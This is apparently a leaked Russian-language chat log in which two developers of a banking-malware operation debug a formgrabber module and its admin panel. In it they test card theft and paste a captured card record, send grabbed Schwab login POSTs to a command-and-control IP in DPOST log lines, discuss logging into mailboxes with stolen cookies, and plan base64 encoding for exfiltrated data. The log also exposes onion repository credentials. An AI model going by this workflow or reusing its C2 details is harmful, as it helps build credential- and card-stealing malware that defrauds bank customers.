[26.07.21 15:49:32] frank:		Привет. 
Ок, я посмотрю, попозже напишу
Сейчас тут завал лютый.
[29.07.21 11:46:39] frank:		Привет.
Слушай, а сможешь бота сделать и попробовать исключительно формы поотправлять для формграббера по картам
Для админки аук?
[29.07.21 11:47:06] frank:		Или к кому можно за этим обратиться ,мне бы посмотреть приходит что то и если нет, то на каком этапе.
[29.07.21 11:47:30] frank:		Рубится. Может вообще ничего не идет а может у меня проблемы
[29.07.21 11:47:44] frank:		С передачей.
[29.07.21 11:48:10] frank:		По всей базе оказалось нереально долго искать.
[29.07.21 12:20:04] frank:		Да
[29.07.21 12:21:37] frank:		Ок, по карте я не скажу
По сути оно все ведь пост данные грабит?
[29.07.21 12:23:54] frank:		Мне сейчас обьяснили как смотреть по нормальному
[29.07.21 12:25:00] frank:		Получается что он присылает данные карты (Номер) а остальное не парсит почему то
[29.07.21 12:25:28] frank:		В общем нам надо посмотреть в каком формате данные карт там по ходу и переделеать регулярки возможно
[29.07.21 12:25:42] frank:		цвв, дату истечения
[29.07.21 12:25:44] frank:		имя
[29.07.21 12:25:54] frank:		Биллинг какой то понятия не имею что это
[29.07.21 12:28:43] frank:		Мда.. Там на самом деле треш какой то в плане того что он считает данными карт.
[29.07.21 12:28:45] frank:		Сек
[29.07.21 12:28:53] frank:		А у тебя доступ в розовую есть?
[29.07.21 12:32:54] frank:		Слушай, я наверное ещё поспрашиваю..
Он грабит кучу всего, но чтобы все нормально работало, надо чтобы были конкретные видимо банки, и под этот формат делать ругулярки.
[29.07.21 12:33:33] frank:		Я посмотрел там есть ссылки, и по некоторым указаны данные карт, но там просто формат другой и регулярки не видят эти данные
[29.07.21 12:33:57] frank:		В общем это не на твоей стороне скорее всего.
[29.07.21 12:33:59] frank:		Ок
[29.07.21 12:36:51] frank:		Да, судя по всему
[29.07.21 12:39:41] frank:		Ты там ничего лишнего не отправил?
[29.07.21 12:40:47] frank:		смотри что там в пвграб
[29.07.21 12:40:47] frank:		git:https://myla@mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion|myla|mfW9F4RaSOzZBuDpz1Eb git:https://n4iaacb37wmqclht.onion|flip|49LaL6JbQZhw8FuGGjmL git:https://flip@n4iaacb37wmqclht.onion|flip|49LaL6JbQZhw8FuGGjmL git:https://mb5fbvx72fbod2hkirfecc5nh7lwq6ke7xocn7j2u7raiwbytvevpbad.onion|myla|mfW9F4RaSOzZBuDpz1Eb
[29.07.21 12:40:54] frank:		Это по моему не норм
[29.07.21 12:41:21] frank:		Все равно странно.
[29.07.21 12:42:14] frank:		Лан
[29.07.21 12:42:26] frank:		Тогда ок, я думал он только по браузеру
[29.07.21 12:43:27] frank:		По дпост надо адама ждать.
[29.07.21 12:44:56] frank:		Я не знаю ип нужный
[29.07.21 12:47:44] frank:		Там какой ип то нужен
Прокладок?
[29.07.21 13:34:56] frank:		Z db;e rexe gjcn pfghjcjd yt vjue gjyznm rfrjq ghj rfhns
[29.07.21 13:35:01] frank:		Я вижу кучу запросов
[29.07.21 13:35:05] frank:		Пытаюсь найти про карты
[29.07.21 13:35:13] frank:		Может ты мне юрл скажешь
[29.07.21 13:35:18] frank:		Где вводил?
[29.07.21 13:36:17] frank:		Ты кстати продолжаешь свой пароль отправлять с этой машины
[29.07.21 13:36:36] frank:		Там такая итория что у нас клиенты имеют доступ к тестовым группам
[29.07.21 13:36:40] frank:		история
[29.07.21 13:36:55] frank:		И если кто то зайдет то получит доступ к твоему репозиторию
[29.07.21 13:37:22] frank:		Лучше попроси деметруса сделатьтебе ещё тачку, для тестов.
[29.07.21 13:37:47] frank:		где ты не работаешь напрямую с нашими юрлами
[29.07.21 13:39:52] frank:		Я попросил время заблокировать все группы tst* клиентам но пока не дали
[29.07.21 13:45:04] frank:		Там у тебя на всех твоих ботах есть этот пароль.
[29.07.21 14:29:35] frank:		Продублируй
[29.07.21 14:29:54] frank:		А ок.
[29.07.21 14:32:23] frank:		Да
[29.07.21 14:32:41] frank:		Только я не знаю какой юрл про карты
[29.07.21 14:32:44] frank:		Сам он не распарсил
[29.07.21 14:34:24] frank:		Ну давай ты попробуешь ввести ,и когда будешь отправлять запиши на какой линк эти данные ушли
[29.07.21 14:34:34] frank:		Просто сверим
[29.07.21 14:36:59] frank:		Туда данные карт должны уйти
[29.07.21 14:37:01] frank:		,
[29.07.21 14:37:03] frank:		?
[29.07.21 14:52:53] frank:		а ты там именно данные карт вводил?
[29.07.21 14:53:59] frank:		По той ссылке нет их, по формам он нашел логин от мыла, но карты не сграбил
[29.07.21 15:12:32] frank:		С хаммером списался он говорит тестеры заняты все
[29.07.21 15:13:11] frank:		Ангело на всякий случай спросил он тоже не отвечает
[29.07.21 15:13:24] frank:		Я тоже без понятия.
[29.07.21 15:31:26] frank:		Что то дпост пока не идет
[29.07.21 15:31:32] frank:		По этому линку
[29.07.21 15:31:41] frank:		логпост*
[29.07.21 16:01:36] frank:		А ты можешь сказать команду которая логпост отправляет
[29.07.21 16:02:28] frank:		Бот почемут о в офф ушел
[29.07.21 16:11:55] frank:		Ок. Вообще я вижу что номер карты пришел
[29.07.21 16:12:14] frank:		Последний момент а есть вариант куда то с cvv и датой ввести данные?
[29.07.21 16:19:56] frank:		А если обменник взять
[29.07.21 16:20:03] frank:		А
[29.07.21 16:20:06] frank:		там не надо цвв
[29.07.21 16:20:23] frank:		А билеты нигде нельзя купить попробовать
[29.07.21 16:20:37] frank:		Типа концертные всякие площадки
[29.07.21 16:21:10] frank:		Или хостинг "оплатить"
[29.07.21 16:26:44] frank:		))))
[29.07.21 16:30:24] frank:		Сложно найти.
[29.07.21 16:30:31] frank:		А на каком юрл вводил данные?
[29.07.21 16:31:16] frank:		На том же боте?
[29.07.21 16:38:13] frank:		Сграбило карту
[29.07.21 16:38:18] frank:		{"mdOrder":"e6634c11-903f-74d1-8ebc-3032023bf0c2","pan":"4627100101654724","cvc":"123","expiry":"202512","cardholder":"CARDHOLDER NAME","externalBindingNotNeeded":false,"language":"ru"}
[29.07.21 16:38:42] frank:		Но не поняло что там за данные
[29.07.21 16:38:47] frank:		Только номер поняло
[29.07.21 16:39:52] frank:		В общем, спасибо за помощь, все работает. На моей стороне сложность - регулярки надо писать
[29.07.21 16:42:52] frank:		Ты опять пароль рабочий скинул
[29.07.21 16:43:07] frank:		Разберись плиз.
Этого бота с картой точно смотреть будут
[29.07.21 16:43:43] frank:		myla|6e5b87546cc70fcb26a18fab6c4462c5
[29.07.21 16:44:40] frank:		Запихнут тебе что нибудь, не весело будет всем
[29.07.21 16:45:06] frank:		https://n4iaacb37wmqclht.onion/
[29.07.21 16:45:09] frank:		Тоже спалил
[29.07.21 16:45:24] frank:		+
[29.07.21 16:45:38] frank:		сейчас попробую выкосить бота.
[29.07.21 16:46:13] frank:		Ну просто показывать наши репозитории не очень хорошо
[29.07.21 16:47:02] frank:		Вообще я не безопасник
Я параноик)
[29.07.21 16:49:36] frank:		У тебя ведь нет юзера в розовой?
[29.07.21 16:49:50] frank:		Я сейчас закрою эту группу всем.
[29.07.21 16:50:09] frank:		Только к черной доступ?
[29.07.21 16:50:25] frank:		Ок
[29.07.21 16:52:02] frank:		Лады.
[29.07.21 16:55:08] frank:		Закрыл, но в любом случае придется сейчас всю базу проверять и выкашивать записи.
[29.07.21 16:55:31] frank:		Лан, удачи!
[30.08.21 13:57:34] jaime:		Привет.
[30.08.21 13:57:53] frank:		Привет.
[30.08.21 13:57:56] jaime:		А что там по формграберу? Нет данных?
[30.08.21 14:13:13] frank:		По одной админке все ок
[30.08.21 14:13:13] frank:		По второй не идут
[30.08.21 14:20:28] jaime:		Мне что нибудь смотреть?
[30.08.21 14:26:12] frank:		Нет, там не в модуле дело.
[08.09.21 12:44:28] jaime:		Привет.
[08.09.21 12:44:45] frank:		Привет
[08.09.21 12:45:01] jaime:		Форм граббер логов то не ведет, он просто отправляет данные
[08.09.21 12:45:29] jaime:		В админку зайти не могу, могу провести тест с заданными urlами
[08.09.21 12:45:47] jaime:		У меня нет доступа к админке
[08.09.21 12:47:39] frank:		Понятно.
То есть нужны юрлы которые не были отправлены и их можно потестить?
У нас есть какие то фильтры по томому что он грабит или он все вытягивать должен что есть в истории?
[08.09.21 12:53:47] jaime:		Да urlы  и будем смотреть
[08.09.21 12:54:07] jaime:		Я в дебаге запущу и посмотрим
[08.09.21 12:55:57] frank:		А насчет фильтров у нас есть такое?
[08.09.21 13:07:36] jaime:		Там есть правила подмены динамические и статичесике, и если ни одно не выполняется то просто дампится POST
[08.09.21 13:08:38] jaime:		Да и с ним есть ньюансы. Например если сервер куда отпралвется DPOST не ответил,  то на 10 минут отрубаем попытки
[29.09.21 13:42:11] jaime:		Привет.
[29.09.21 13:42:20] frank:		Привет
[29.09.21 13:42:41] jaime:		По проблеме. Как это не показывает e-mail?
[29.09.21 13:42:49] jaime:		У меня логина в админку нет
[29.09.21 13:43:27] frank:		Ну я так понял они импортируют куки
[29.09.21 13:43:40] frank:		И пытаются зайти на почту
[29.09.21 13:43:41] jaime:		Ага
[29.09.21 13:44:00] frank:		Я могу куки скинуть по идее
[29.09.21 13:44:05] jaime:		По симпортированным кукам?
[29.09.21 13:44:09] frank:		Да
[29.09.21 13:44:21] jaime:		Это типа супер браузер?
[29.09.21 13:44:39] frank:		Ну и вообще, что нужно чтобы потестить.
Я так понимаю да, у них линка везде, мне дедик скидывали
[29.09.21 13:44:57] frank:		Могу уточнить пробовали ли через СБ
[29.09.21 13:46:01] jaime:		Я понял. Я думал что то другое. Я не умею заходить по сграбленным кукам.
[29.09.21 13:46:07] jaime:		:)
[29.09.21 13:46:34] jaime:		Я думал тут что то с webinjecтом типа на станице нет логина
[29.09.21 13:46:34] frank:		А не знаешь кто умеет, я тоже просто не знаю как это делается.
[29.09.21 13:46:59] jaime:		Сейчас Анжело подключу может он знает
[29.09.21 13:47:10] jaime:		Он как то тестил СуперБраузер
[29.09.21 13:47:12] frank:		Ок. Спасиб.
[29.09.21 13:51:39] jaime:		Анжело подтвердил слова Сильвера :)
[29.09.21 13:53:53] frank:		Окей) Хорошо что поясней стало
[01.11.21 12:51:53] jaime:		Привет!
[01.11.21 12:52:52] frank:		Привет
[01.11.21 12:53:24] frank:		Я гляну сейчас машину
[01.11.21 12:53:31] frank:		Нужно аук перезапустить
[01.11.21 12:54:14] jaime:		У меня все готово, посмотрим лог пост от schwab куда он там девается?
[01.11.21 13:22:52] frank:		Что то странное
[01.11.21 13:24:26] frank:		EC1BBC962A404D9A8D9D8E3BCDBAD781 ты этого бота на аук отправил?
[01.11.21 13:36:35] jaime:		EC1BBC962A404D9A8D9D8E3BCDBAD781 да мой, но это не бот
[01.11.21 13:37:05] jaime:		Это просто модуль настроенный на zev11 для проверки граба
[01.11.21 13:37:55] frank:		Я просто смотрю, и не вижу на входе тоже данных, перезапусти плиз еще раз я логи почистил
[01.11.21 13:38:10] jaime:		Конечно сейчас
[01.11.21 13:38:12] frank:		Попробую все запросы скопировать
[01.11.21 13:39:00] jaime:		запустил
[01.11.21 13:39:24] jaime:		Сейчас https://www.schwab.com/ зайду
[01.11.21 13:40:26] jaime:		URI=http://195.39.233.29:443/zev11/QWERTY_W617600.11FD0A215899476E89D598EAD930AD31/60/ вижу ушел
[01.11.21 13:40:37] jaime:		/1/ пришел
[01.11.21 13:40:52] frank:		А в логах на вход что ушло ты можешь поглядеть?
[01.11.21 13:40:56] frank:		Есть там лог\пасс?
[01.11.21 13:41:03] jaime:		user: superman, pass: supermanlox
[01.11.21 13:42:01] jaime:		```/api/v2/web/assert?aid=sws_web&did=5bca9424-d84f-4059-ac0a-6ce65ad9fb49&sid=42460d8f-79b4-49ac-8843-f06acf23dfd9&locale=ru-RU&clientId=CustomerWeb&sessionId=20880915-e4e8-41b5-8819-8f1dc66bd523&correlationId=11ac9ce3-6396-45cd-9b99-80005e86d938&throttle=true

```
[01.11.21 13:42:32] jaime:		Вот прям этого лога досканально детального нет,  есть такой же записанный на моем сервере
[01.11.21 13:43:09] jaime:		https://privnote.com/AWgp8yTW#AtaX2W6I4
[01.11.21 13:44:23] jaime:		Там есть поле {"headers":[{"type":"uid","uid":"superman"}] - это логин, и есть поле "data":{"password":"supermanlox"}
[01.11.21 13:46:39] jaime:		Может там из-за поля link не так что разбирается?
[01.11.21 13:55:12] frank:		Не вижу нигде..
[01.11.21 13:55:48] frank:		Давай еще раз
[01.11.21 13:55:58] frank:		Перенастроил кое чего тут
[01.11.21 13:56:39] jaime:		Ага сейчас
[01.11.21 13:57:28] jaime:		Шлю сюда http://195.39.233.29:443
[01.11.21 13:58:34] jaime:		```
DPOST URI=http://195.39.233.29:443/zev11/QWERTY_W617600.75C40C477CB4428099EC34360A24C70B/60/ DATA=POST /i/13884/da/?type=multi&wid=263675&sid=5AAFA4548E33AE863E51AA13488D0153BD&pvid=1635775077173&dnt=1&dc=5&dv=1&dl=995&retryCode=socketTimeout HTTP/1.1
```
[01.11.21 13:58:46] jaime:		01.11.2021 16:58:11 DPOST response: /1/
[01.11.21 13:59:12] jaime:		```
DPOST URI=http://195.39.233.29:443/zev11/QWERTY_W617600.75C40C477CB4428099EC34360A24C70B/60/ DATA=POST /api/v2/web/assert?aid=sws_web&did=5bca9424-d84f-4059-ac0a-6ce65ad9fb49&sid=6108420e-8015-4b13-a46d-6c3fceba7664&locale=ru-RU&clientId=CustomerWeb&sessionId=1ee95221-9621-4bfe-b83b-7f7096efd006&correlationId=8d43ea91-460a-4c90-a6f9-8c3536b3ffc8&throttle=true HTTP/1.1
```
[01.11.21 13:59:35] jaime:		Вот тут должен быть пароль, внутри POSTа
[01.11.21 14:05:25] frank:		На вход пароль приходит
[01.11.21 14:06:00] frank:		Есть возможность то же самое проделать с бота Ч,тобы всю цепочку проверить?
[01.11.21 14:07:34] jaime:		С бота нужно Хаммера попросить или Анжело
[01.11.21 14:07:42] jaime:		Сейчас попробую найти кого
[01.11.21 14:11:23] jaime:		Сейчас Анжело освободится проверит
[01.11.21 14:33:16] frank:		Есть вариант на боте сделать это на нормальном?
[01.11.21 14:33:23] frank:		Чтобы всю цепочку увидеть
[01.11.21 14:37:04] jaime:		От тебя что то приходило? Будто светило парой сообщений
[01.11.21 14:39:53] frank:		отр
[01.11.21 14:42:23] frank:		продублируй
[01.11.21 14:42:29] frank:		Или напиши жабу
[01.11.21 14:42:37] frank:		Что то толком не работает этот сайт
[01.11.21 14:42:41] jaime:		С бота нужно Хаммера попросить или Анжело
Сейчас попробую найти кого
Сейчас Анжело освободится проверит
[01.11.21 14:42:57] jaime:		ОТР куда то слетел
[18.11.21 17:25:52] frank:		Привет, ты случаем не на связи?
[18.11.21 18:21:31] jaime:		привет!
[18.11.21 18:21:33] jaime:		Тут
[18.11.21 18:21:39] jaime:		Набегами!
[18.11.21 18:21:55] jaime:		Сейчас перекушу и буду!
[18.11.21 18:21:59] jaime:		Пиши что нужно!
[18.11.21 18:22:23] frank:		Я хотел спросить, ты не в курсе откуда берется ид бота?
[18.11.21 18:22:54] frank:		Как так получается что он уникальный все время, он с бэка получается при соединении 
Или это какая то уникальная штука с машины целевой?
[18.11.21 18:23:08] frank:		E2BBE7BF7C3BBFDA332F1EDF119F7158
[18.11.21 18:23:12] frank:		Вот в таком виде
[18.11.21 18:32:19] jaime:		А вот тут не скажу мне его Цезарь передает. Это он знает.
[18.11.21 18:35:17] jaime:		Что то уникальное нужно вытянуть. Может серийник винта. Ты хочешь его упростить?
[18.11.21 18:48:53] frank:		Да
[18.11.21 18:48:58] frank:		Оке спрошу у него
[18.11.21 18:53:10] jaime:		В int 64 бы убрать было бы супер!
[18.11.21 18:55:15] jaime:		А если таблицу с ботid а индекс от туда по остальным данным?
[18.11.21 18:56:05] jaime:		По идее из первой быстро выбрать, а с интом потом и по остальным норм будет
[18.11.21 18:58:43] jaime:		Хотя не мне давать тебе советы :)
[18.11.21 19:08:47] jaime:		А вот еще. От форм граббера летит всякий мусор наверное процентов 90 может больше. всякая статистика и прочее, может это порезать? По урлам? Выбрать что там больше всего не нужно и нафиг не слать?
[25.11.21 10:33:01] frank:		Привет
[25.11.21 11:09:22] jaime:		Привет!
[25.11.21 11:11:16] frank:		Я пытаюсь понять, ты ангело написал что не парсятся сессионные куки..
Я верно понял тебя?

Или ты имел ввиду что должны быть эти куки и ты просто принцип описал?
[25.11.21 11:18:24] jaime:		А нет я просто принцип
[25.11.21 11:18:53] jaime:		Судя по тому что он мне показал, там не куков сессии, только какие то нстройки
[25.11.21 11:19:16] jaime:		Либо они не пришли и не были добавлены в базу, либо не выгрузились
[25.11.21 11:19:25] jaime:		Там фигня какая то.
[25.11.21 11:21:33] jaime:		Анжело тебе не показывал?
[07.12.21 17:49:18] frank:		Привет
[07.12.21 18:46:53] jaime:		Привет!
[07.12.21 21:29:36] frank:		Завтра уже напишу.
[08.12.21 11:13:37] jaime:		Привет!
[08.12.21 11:13:53] jaime:		Вчера не списались. :)
[08.12.21 11:25:56] frank:		Привет!
Хаммер говорит что-то с формграббером не здоровое твориться.
Сейчас вынесу в общий этот вопрос.
[08.12.21 11:27:18] jaime:		Странно, вчера вроде он тестил говорит что норм
[08.12.21 11:27:34] jaime:		Были проблемы из за конфиги инжекта
[08.12.21 11:27:39] jaime:		Адам ее удалил
[08.12.21 11:48:17] jaime:		https://privnote.com/ArOORfsk#Fx9DBkQXs
[08.12.21 11:48:31] jaime:		По формату POST
[08.12.21 11:51:58] frank:		Это по вчерашнему боту?
(По которому не пришли логи)
[08.12.21 11:52:47] jaime:		Не это абстракция. это я сейчас снял
[08.12.21 11:52:57] jaime:		Такого уровня логов сейчас нет
[08.12.21 11:53:16] jaime:		Это нужно целиком POST дампить
[08.12.21 11:53:39] jaime:		Я сейчас на сервере его сдампил
[08.12.21 11:54:26] jaime:		Сейчас расширю тогда логирование буду весь POST писать.
[08.12.21 11:54:36] jaime:		Но нужно будет повторить эксперимент
[08.12.21 11:57:52] frank:		ну вот то что ты скинул тоже нормально. Перекодировать там надо и разбить, но я мог бы с этим уже разобраться
В любом случае это нужно в будущем будет, в случае если будут проблемы и нужно будет понять в чем дело.
[08.12.21 11:58:16] jaime:		Сейчас сделаем лог сырых POST в отдельный файл
[08.12.21 11:58:28] frank:		Хорошо, спасибо!
[08.12.21 11:58:44] jaime:		Вообще не за что! :)
[08.12.21 15:59:22] jaime:		А в POST могут тебе прилетать двоичные данные?
[08.12.21 16:01:39] frank:		Как это проверить?
Там есть на бэке конвертация из бинарных данных
[08.12.21 16:13:43] jaime:		2021-12-08 18:54:51: DPOST data: POST /tst261/DESKTOP-149IKLJ_W10019043.9FD9E23BBD5964BFA4D5C3BB8BF7E7E3/60/ вот тут слал
[08.12.21 16:14:06] frank:		Ок, что нужно найти?
[08.12.21 16:14:31] jaime:		А что с ними стало?
[08.12.21 16:14:49] jaime:		Не повредили чего?
[08.12.21 16:14:52] frank:		На аук?
или дног?
[08.12.21 16:15:08] frank:		Или хз?)
[08.12.21 16:15:24] jaime:		```
-----------JGPGYHQLPZTOMECV
Content-Disposition: form-data; name="data"

POST /gts1c3 HTTP/1.1
Host: ocsp.pki.goog
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/ocsp-request
Content-Length: 84
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

0R0P0N0L0J0	+ Ç.yŠÝÿa4³ºíGB¸»ÆÀ$cŠt¯…Íî•Í=œÐâFóq5' ¾’|——¦wþ
   Qˆ 
-----------JGPGYHQLPZTOMECV

```
[08.12.21 16:15:38] jaime:		А вот тут не скажу
[08.12.21 16:15:46] frank:		ок, проверю оба
[08.12.21 16:15:49] frank:		Сек
[08.12.21 16:36:38] frank:		На входе они есть
\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/ocsp-request\r\nContent-Length: 84\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n0R0P0N0L0J0\t\u0006\u0005+\u000E\u0003\u0002\u001A\u0005\u0000\u0004\u0014Ç.y<8a>Ýÿa4³ºíGB¸»ÆÀ$\u0007c\u0004\u0014<8a>t^?¯<85>Íî<95>Í=<9c>ÐâF\u0014óq5\u001D'\u0002\u0011\u0000¾<92>|<97><97>¦wþ\n\u0000\u0000\u0000\u0001\u0019Q<88>\u0000\r\n-----------JGPGYHQLPZTOMECV\r\nContent-Disposition: form-data; name=\"keys\"\r\n\r\n\r\n-----------JGPGYHQLPZTOMECV\r\nContent-Disposition: form-data; name=\"link\"\r\n\r\nhttp://ocsp.pki.goog/gts1c3\r\n-----------JGPGYHQLPZTOMECV--\r\n"
[08.12.21 16:37:15] frank:		Я так понял дальше ошибка где то с ними происходит
Их на самом боте получается нет?
[08.12.21 16:37:32] frank:		они то бишь данные)
[08.12.21 16:40:10] jaime:		А у меня нет доступа в админку! :)
[08.12.21 16:40:44] jaime:		Я просто не очень понимаю как мы будем сверять все ли доходит или нет?
[08.12.21 16:41:12] jaime:		Логирование я добавил. Все пишется в отдельный файл. Можно смотреть.
[08.12.21 16:45:08] frank:		Не знал что нет
Сейчас сам загружусь проверю.
[08.12.21 16:47:58] jaime:		Я тут отойду на часок. Жена пришла, нужно развлечь ужином! :)
[08.12.21 16:48:49] frank:		Вот инфа в админке
[08.12.21 16:49:04] frank:		```
/gts1c3
Host
ocsp.pki.goog
User-Agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Content-Type
application/ocsp-request
Content-Length
83
Unknown
0Q0O0M0K0I0 +Ç.yÝÿa4³ºíGB¸»ÆÀ$ct¯ÍîÍ=ÐâFóq5'sxÝÈêÅ Sg
```
[08.12.21 16:49:21] frank:		```
Link ID
38137010
Link
http://ocsp.pki.goog/gts1c3
Region Name
13
Resolve
ip-144-21.dataclub.eu
Net
tst261
IP
109.248.144.21
Date Time
2021-12-08 18:29:41.085823
Country
Kazakhstan
OS
windows
OS Version
10019043
```
[08.12.21 16:50:13] frank:		Вроде не все дошло
[08.12.21 16:50:14] frank:		)
[08.12.21 16:50:47] frank:		Верно вижу?
[08.12.21 16:55:52] jaime:		Ну так то похоже
[08.12.21 16:56:16] jaime:		Это какая то статистика была по всей видимости
[08.12.21 17:00:11] frank:		Не хватает символов
[08.12.21 17:00:18] frank:		Я думаю, может быть мы бинарные данные будем так же как в куках
[08.12.21 17:00:19] frank:		В б64 кодировать?
[08.12.21 17:13:27] jaime:		А как можно узнать бинарные они там или нет?
[08.12.21 17:13:52] jaime:		Пробежаться и посмотреть на диапазон?
[08.12.21 17:13:58] frank:		В куках все кодируется.
[08.12.21 17:14:39] jaime:		Да думаю можно переделать.
[08.12.21 17:15:09] jaime:		Content-Length: нужно пересчитывать?
[08.12.21 17:18:06] jaime:		Content-Disposition: form-data; name="data"  прям все пакую в b64?
[08.12.21 17:19:33] frank:		Думаю да. Мы сейчас решаем проблему с тем что данные не полные, если они бинарные..
Сделай тогда тестовый модуль, проверим как с ним будет, и когда будешь цезаря просить залить, попроси на аук залить а не на дног.
[08.12.21 17:19:55] frank:		Есть вероятность что мы таким образом решим и проблему с недоходящими данными
[08.12.21 17:20:18] jaime:		Понял. Постараюсь завтра сделать.
[08.12.21 17:20:19] frank:		Может быть что там какая-то статистика в двоичном формате и багается на этапе записи в базу.
[08.12.21 18:03:27] jaime:		https://privnote.com/bLOvlWGg#pe7HSGTYB
[08.12.21 18:03:34] jaime:		Так норм будет?
[08.12.21 18:07:59] frank:		да.
[08.12.21 18:14:52] jaime:		Видимо завтра, Цезаря уже нет. Льем на Аук!
[10.12.21 10:15:28] frank:		Привет.
[10.12.21 10:21:05] jaime:		Привет!
[10.12.21 10:25:50] frank:		такой вопрос, вы заливали на аук новый модуль формграббера и если да, верно ли я понимаю что он залит в тестовом формате сейчас7
[10.12.21 10:26:35] frank:		то есть вы не заменили старый а именно залили рядом, я именно про перекодированный формграббер говорю.
[10.12.21 10:27:06] frank:		где б64
[10.12.21 10:27:30] jaime:		Да залили на аук, только тестовую версию. С поддержкой b64
[10.12.21 10:27:42] jaime:		Совершенно верно
[10.12.21 10:27:55] jaime:		Его нужно запустить отдельной командой
[10.12.21 10:28:11] frank:		Понятно.
Да просто дата не прогружается
[10.12.21 10:28:26] frank:		Буду дальше проверять
[10.12.21 10:29:41] jaime:		А вряд ли кто то кроме Хаммера загружал модуль
[10.12.21 10:30:34] jaime:		Так она наверное и не прогружается, ты ждешь в b64, а там по старому идет
[10.12.21 10:31:09] jaime:		может нужно было сделать не дата, а b64data, что бы было понятнее?
[10.12.21 10:32:21] frank:		Нет, я ещё не прогрузил новый код
[10.12.21 10:32:32] frank:		Поэтому и спросил, думал может рассинхрон у нас
[10.12.21 10:36:25] jaime:		не на боевую не внедряли, нужно проверить :)
[10.12.21 10:43:48] frank:		Ok
[13.12.21 17:06:48] jaime:		Привет!
[13.12.21 17:07:04] frank:		Привет
[13.12.21 17:08:00] jaime:		Что там у нас по b64? Что то не так?
[13.12.21 17:08:52] frank:		Пытаюсь докрутить, я не очень понял что именно хаммер говорит
[13.12.21 17:09:13] frank:		хайми не писал по поводу почему в логпост в data нет данных? я ему скидывал лог, там это и-за неверной шифровки
4:29 PM
10 мин
4:29 PM
Дошли сообщения?
4:30 PM
да
4:34 PM
там при декодировке получается типа такого
POST /dns-query HTTP/1.1
Host: chrome.cloudflare-dns.com
Connection: keep-alive
Content-Length: 128
Accept: application/dns-message
Accept-Language: *
User-Agent: Chrome
Accept-Encoding: gzip;q=1,deflate,br;q=0
Content-Type: application/dns-message

���������wwwgstaticcom�����)������T��P���������������������������������������������������������������������������������
4:41 PM
хм
А что это за шифровка?
То есть это на строне самого бота где-то происходит?
Получается что вот в таком виде оно приходит на серв и там багается у меня где-то?
Как я могу помочь в этой истории всей, что от меня нужно?
Нет, пока хайми не писал
4:59 PM
это из лога дпоста
вот который хайми добавил, сырой который
получается, он его шлёт, а админка не может расшифровать и не показывает
тебе лучше с ним списаться, он лучше расскажет, мы с ним в пятницу это смотрели
это нужно поправить, иначе я в датье так и не увижу, что там вообще
[13.12.21 17:11:52] jaime:		ну да я все  поле data в base64 закинул, заголовик правильные, а сами данные двоичные. Фиг знает что с ними делать.
[13.12.21 17:12:12] jaime:		А так на взгляд все ок.
[13.12.21 17:12:34] frank:		Я ведь верно понимаю что это отдельный модуль?
[13.12.21 17:12:38] frank:		Типа тестовый
[13.12.21 17:13:01] frank:		И сейчас он смотрит логи ииз за того что там б64 он не может прочитать?
[13.12.21 17:13:52] frank:		Я верно понимаю что просто нужно перекодировку добавить?
Или это какая то болеке серьезная проблема?
[13.12.21 17:14:52] jaime:		Да все верно. Это тест, и оне не получает потому что нет перекодировки.
[13.12.21 17:15:06] frank:		Ок
[13.12.21 17:15:12] jaime:		Может я данные не в дата положу, а data64?
[13.12.21 17:15:13] frank:		Все понятно.
[13.12.21 17:15:35] frank:		Давай так
[13.12.21 17:15:43] frank:		Мне намного проще будет.
[13.12.21 17:15:56] jaime:		Можно продублировать
[13.12.21 17:16:29] frank:		Ок, давай так я отдельно выведу просто перекодированный вариант, чтобы понять то ли это, что нам нужно.
[13.12.21 17:16:38] jaime:		Просто фигня получается, с боевых так, с тестовых так
[13.12.21 17:19:24] frank:		Да. Ну нужно как то потестить что доходит.
[13.12.21 17:19:38] frank:		Я уже сейчас могу, но в админке это не проверить.
[15.12.21 13:51:57] frank:		Привет, ты добавил в тестовую сборку это поле с b64 отдельно?
[15.12.21 14:09:53] jaime:		Привет!
[15.12.21 14:10:01] jaime:		Нет ничего не менял идет в data
[15.12.21 14:32:49] frank:		Ок. Смог бы ты сдлеать это? Как у тебя со временем сегодня-завтра?
Я сейчас перед таким выбором, что я могу заменить код на аук, но не факт что будет все работать
Начнут операторы писать, если что-то полетит...
С другой стороны хаммер пишет, что нужно потестить т.к. часть данных не доходит в формграббере в нашем старом формате.
Мы тогда поняли, что не доходят именно бинарные данные, эта фича по сути должна закрыть вопрос с этими не доходящими данными.
[15.12.21 14:33:15] frank:		Но вот пока что нет идей почему время от времени перестают идти данные в обычном формате.
[15.12.21 14:34:33] frank:		Я сильно затянул новый код по передаче логпоста в хранилище, но постараюсь на днях его запилить на аук, там все пойдет в один поток большими пачками, если это не решит проблему. напишу
[15.12.21 14:37:24] jaime:		Да сегодня сделаю, назовем поле datab64
[15.12.21 14:38:05] frank:		Ок, еще вопрос такой
Есть ли возможность как то понять что данные бинарные, а не обычные
[15.12.21 14:38:13] jaime:		За малым схожу с сделаю
[15.12.21 14:38:19] frank:		На модуле или может быть пометить их как-то
[15.12.21 14:38:23] frank:		Окей
[15.12.21 14:38:55] jaime:		А вот я сам не знаю, я же просто POST дапю. Только по application-content ?
[15.12.21 14:41:00] frank:		Ладно ок, давай сделаем то что задумали и ещё раз проверим.
[15.12.21 16:29:35] jaime:		Так я добавил
[15.12.21 16:29:46] jaime:		Могу тестики поотправлять
[15.12.21 16:30:05] frank:		Отлично!
Какая команда запускает этот тестовый модуль?
[15.12.21 16:30:14] frank:		Или эт к цезу?
[15.12.21 16:30:19] jaime:		Ха он только у меня
[15.12.21 16:30:26] frank:		А
[15.12.21 16:30:29] jaime:		Да Цезаря нет модуль не обновили
[15.12.21 16:30:53] frank:		ок, напиши плиз как зальете на аук, я со своей стороны поменяю тоже.
[15.12.21 16:31:18] jaime:		Или ждать будем Цезаря
[15.12.21 16:31:21] jaime:		Понял отпишу
[15.12.21 16:32:27] jaime:		datab64 будет запакованное, data по по старому
[15.12.21 16:32:53] frank:		Хорошо
